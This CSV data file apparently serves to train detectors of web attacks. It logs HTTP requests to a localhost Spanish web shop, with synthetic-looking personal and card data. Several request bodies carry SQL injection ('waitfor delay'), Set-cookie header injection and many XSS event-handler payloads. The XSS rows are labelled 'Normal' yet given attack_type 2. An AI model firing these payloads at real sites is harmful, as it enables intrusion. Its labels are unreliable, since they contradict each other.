Unnamed: 0,Method,User-Agent,Pragma,Cache-Control,Accept,Accept-encoding,Accept-charset,language,host,cookie,content-type,connection,length,content,classification,URL,attack_type
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=78877EEDA767B0ACA8914B960CE18AE8,application/x-www-form-urlencoded,Connection: close,Content-Length: 67,"<area onkeydown=""alert(1)"" contenteditable>test</area>",0,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,2
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=EC1536E4675CEF1760CAA24F63A0D67D,application/x-www-form-urlencoded,Connection: close,Content-Length: 325,"modo=registro&login=eamonn&password=673que422&nombre=Arador&apellidos=Gala+Vaquer&email=killorin@lodgeinmadrid.gl&dni=38367717Z&direccion=Grup+De+La+Torre+Lloveta+145+&ciudad=Huerta+de+Rey&cp=31133&provincia=Huesca&ntc=5414663163826513&B1=','0','0','0','0');waitfor+delay+'0:0:15';--",1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=028AB13184103D4463CCC79F1AA19B20,application/x-www-form-urlencoded,Connection: close,Content-Length: 226,modo=registro&login=jargon_&password=bAquet0&nombre=Otmar&apellidos=Valcarcel&email=abbe@natravea.tk&dni=28221877A&direccion=Jocs+Olimpics+110+1-B&ciudad=Har�a&cp=19262&provincia=Salamanca&ntc=2036710936767005&B1=Registrar,0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,0
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=577AA4FADDA9A7BB026940F7473EC803,application/x-www-form-urlencoded,Connection: close,Content-Length: 38,modo=insertar&precio=342&B1A=Confirmar,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=CEAF492834A11DADB4ED0B60F8DCED83,application/x-www-form-urlencoded,Connection: close,Content-Length: 255,modo=registro&login=kozsukan&password=3749s63a&nombre=Avito&apellidos=Zalarich+Llufriu&emailA=saul@expertmagnet.np&dni=14335839P&direccion=C/+Barranquet+130+&ciudad=Calzada+de+los+Molinos&cp=50470&provincia=A+Coru�a&ntc=9270239658811052&B1=Registrar,1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=052383267C2D5E69642C4AFA628A2EE4,application/x-www-form-urlencoded,Connection: close,Content-Length: 43,"<form onbeforepaste=""alert(1)"" contenteditable>test</form>",0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=8335EC9A57FC5D3F8CF6FBEC4EF845B4,application/x-www-form-urlencoded,Connection: close,Content-Length: 246,"modo=registro&login=ivey&password=aventada&nombre=Socorro&apellidos=Pinela&email=urette@elcarritodelacompra.ch&dni=70190724Z&direccion=Calle+Calcio,+58,+3-H&ciudad=Congostrina&cp=24892&provincia=Ciudad+Real&ntc=0600142480531797&B1=Registrar",0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=2C9747A9106F261F542B921CD8027062,application/x-www-form-urlencoded,Connection: close,Content-Length: 261,"<style>:target {transform: rotate(180deg);}</style><b id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></b>",0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=FEB1B8E9DA7BA38E2C2E07345922CC1B,application/x-www-form-urlencoded,Connection: close,Content-Length: 38,"<style>:target {color: red;}</style><button id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></button>",0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=66EA46B5A3646366057C7885263D338B,application/x-www-form-urlencoded,Connection: close,Content-Length: 255,"<picture onkeydown=""alert(1)"" contenteditable>test</picture>",0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,2
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=9B7C882ACE4895E99A3549BCA2A35098,application/x-www-form-urlencoded,Connection: close,Content-Length: 66,modo=entrar&login=trahan&pwd=72513662r719&remember=on/&B1=Entrar,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=6E4B6527331A23C91E63FE5FD7D5E2E8,application/x-www-form-urlencoded,Connection: close,Content-Length: 97,modo=insertar&precio=20any%0ASet-cookie%3A+Tamper%3D1041264011025374727&B1=Pasar+por+caja,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=20B47F4E788F9BF8855F5B6F0656D9E0,application/x-www-form-urlencoded,Connection: close,Content-Length: 38,<tr id=x tabindex=1 ondeactivate=alert(1)></tr><input id=y autofocus>,0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,2
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=F69E6C56F3980AEB6D17E098B08A7B95,application/x-www-form-urlencoded,Connection: close,Content-Length: 59,modo=entrar&login=reiman&pwd=7asto&remember=on/&B1=Entrar,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=6D88E921F08029269ED8F2B52C7B0BA8,application/x-www-form-urlencoded,Connection: close,Content-Length: 61,modo=entrar&login=allman&pwd=odiosid-ad&remember=on&B1=Entrar,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=135CBFBF3E34AA9E66E68DA79AE53A15,application/x-www-form-urlencoded,Connection: close,Content-Length: 251,"modo=registro&login=kit&password=artiller�a&nombre=Najli&apellidos=Angullo+Acosta&email=boring_besch@copiar.com.pg&dni=97963158V&direccion=C/+Las+Ni�adas,+67+9?F&ciudad=Bola,+A&cp=49394&provincia=Navarra&ntc=0949927790340653&B1=Registrar",0,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=B0E4F8773EC1D35FF28DFE9649A66E5A,application/x-www-form-urlencoded,Connection: close,Content-Length: 67,id=1&nombre=Vino+Rioja&precio=39&cantidad=76&B1=A�adir+al+carrito,0,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=B7CAB03F578E112AF95735E76B11791C,application/x-www-form-urlencoded,Connection: close,Content-Length: 58,modo=entrar&login=thies&pwd=suponer&remember=off&B1=Entrar,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=C7D3BD3F46971EA1E47D91188C9A5CAE,application/x-www-form-urlencoded,Connection: close,Content-Length: 61,modo=entrar&login=mcallum&pwd=garabero&remember=off&B1=Entrar,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,0
Anomalous,PUT,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,,"x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:9090,JSESSIONID=5A7DFFC22C8232E766FDBDF8196E097D,application/x-www-form-urlencoded,Connection: close,Content-Length: 268,"modo=registro&login=orin&password=-picardo&nombre=Abdel&apellidos=Butgardon+Nogueola&email=gruber_coonleu2@13horas.gd&dni=01485962R&direccion=C/+Dean+Zaragoza,+121,+3?F&ciudad=Manzanares+de+Rioja&cp=10320&provincia=Tarragona&ntc=7019128691164371&B1=Registrar",1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=1350D5C598CB3CC8721F65F2D9FEC93C,application/x-www-form-urlencoded,Connection: close,Content-Length: 61,modo=entrar&login=rachelle&pwd=escinco&remember=on&B1A=Entrar,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=A7A78C0C1C5A4A5C1AD36ED2C97D4D58,application/x-www-form-urlencoded,Connection: close,Content-Length: 246,modo=registro&login=flint&password=heRBecER&nombre=Nabil&apellidos=Salleras+Lima&email=volmut8@santcugatpisos.ca&dni=51483838V&direccion=Calle+Isla+Columbretes+111+&ciudad=Soto+de+Cerrato&cp=47120&provincia=?&ntc=2744245058125133&B1=Registrar,1,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=43BD9D663A7331DD21888EA3A3EE9842,application/x-www-form-urlencoded,Connection: close,Content-Length: 62,modo=entrar&login=macinnes&pwd=18vi5i9ad&remember=on&B1=Entrar,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=4F384E95EEFB3B965070588D7B3EE74F,application/x-www-form-urlencoded,Connection: close,Content-Length: 38,"<image draggable=""true"" ondragleave=""alert(1)"">test</image>",0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,2
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=A5792755ECC7AEF395B75689ED379BB9,application/x-www-form-urlencoded,Connection: close,Content-Length: 319,"modo=registro&login=buffett&password=vejete&nombre=Zoeli&apellidos=Navas+Gorriz&email=lowler-hoi-shan6@webgune.bj&dni=90025435P&direccion=Cabrera,+153+7?A&ciudad=Santa+Mar�a+de+Ord�s&cp=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&provincia=Lleida&ntc=9769918811334498&B1=Registrar",1,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=5C349810239567CD5B4131257A935A9C,application/x-www-form-urlencoded,Connection: close,Content-Length: 317,modo=registro&login=schlemme&password=al4erchig7L&nombre=Feliciano&apellidos=Bergas+Patraca&email=trotta.carslisle@softstylestudio.ki&dni=38227979R&direccion=Calle+Mar+De+Aragon+48+1?E&ciudad=Pozuelo+de+la+Orden&cp=16710&provincia=Set-cookie%3A+Tamper%3D1041264011025374727&ntc=0473794196460600&B1=Registrar,1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=C2BC24F5D6310CF5470C77610D8663D8,application/x-www-form-urlencoded,Connection: close,Content-Length: 65,modo=entrar&login=flaherty&pwd=j+aqu�s&remember=on&B1A=Entrar,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=A7FFEA06C1FB287D3089FA0D4B140BA8,application/x-www-form-urlencoded,Connection: close,Content-Length: 246,<col id=x tabindex=1 onbeforeactivate=alert(1)></col>,0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=185DC5A8B6F7A6BB641A55C6BA66EC7A,application/x-www-form-urlencoded,Connection: close,Content-Length: 37,modo=insertar&precio=389&B1=Confirmar,0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=DAA95C5837E12A1F540D8ECC7D2B3FA5,application/x-www-form-urlencoded,Connection: close,Content-Length: 57,modo=entrar&login=diffee&pwd=Gatada&remember=on&B1=Entrar,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=B2134B0D01FE6B0D384DEB1D82A81A36,application/x-www-form-urlencoded,Connection: close,Content-Length: 58,"<abbr onbeforecut=""alert(1)"" contenteditable>test</abbr>",0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,2
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=18A7EC2BF10A521141E5D3F7283A3B0E,application/x-www-form-urlencoded,Connection: close,Content-Length: 69,modo=entrar&login=lilllie8&pwd=4mpo599c7miento&rememberA=on&B1=Entrar,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=0F75CD9C9465E571CE7E55E21B1BE9DA,application/x-www-form-urlencoded,Connection: close,Content-Length: 67,"<applet onbeforecopy=""alert(1)"" contenteditable>test</applet>",0,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,2
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=DF8BBA9697C009B2EB0A94F5CC3699B1,application/x-www-form-urlencoded,Connection: close,Content-Length: 63,modo=entrar&login=joannidi&pwdA=mis9tura&remember=off&B1=Entrar,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=95C58B63E02C53452851CE05DA65D803,application/x-www-form-urlencoded,Connection: close,Content-Length: 42,modo=insertar&precio=766&B1=Pasar+por+caja,0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=62F279018392E0F4ABDB9BD655F7E3FE,application/x-www-form-urlencoded,Connection: close,Content-Length: 60,<hgroup onpointerup=alert(1)>XSS</hgroup>,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=9A4BACEA9777DCA0D34C3FF41DEEFC10,application/x-www-form-urlencoded,Connection: close,Content-Length: 233,"<marquee onkeyup=""alert(1)"" contenteditable>test</marquee>",0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,2
